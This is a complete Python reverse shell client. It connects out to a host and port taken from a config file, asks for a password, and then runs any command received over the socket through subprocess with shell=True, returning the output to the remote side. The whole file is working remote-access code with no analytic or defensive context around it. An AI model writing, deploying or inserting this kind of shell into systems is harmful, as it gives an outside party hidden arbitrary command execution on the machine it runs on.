import os
import subprocess
import socket
import traceback

from config import CONFIG


def send(string):
    global soc
    soc.send(string.encode())


def recv(length):
    global soc
    return soc.recv(length).decode()


def login():
    global soc
    send("Login: ")
    pwd = recv(2000)

    if pwd.strip() == CONFIG.pwd:
        return True
    return False


def shell():
    global soc
    send("#> ")
    while True:
        data = recv(2000)
        output = ""

        if data.strip() == ":quit":
            return
        elif data.strip()[0:2] == "cd":
            try:
                os.chdir(data.strip()[2:].strip())
            except:
                output = traceback.format_exc()
        else:
            command = subprocess.Popen(
                data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = command.stdout.read().decode() + " " + command.stderr.read().decode()

        send(output)
        send("#> ")


if __name__ == "__main__":
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect((CONFIG.host, CONFIG.port))
    while not login():
        continue
    shell()
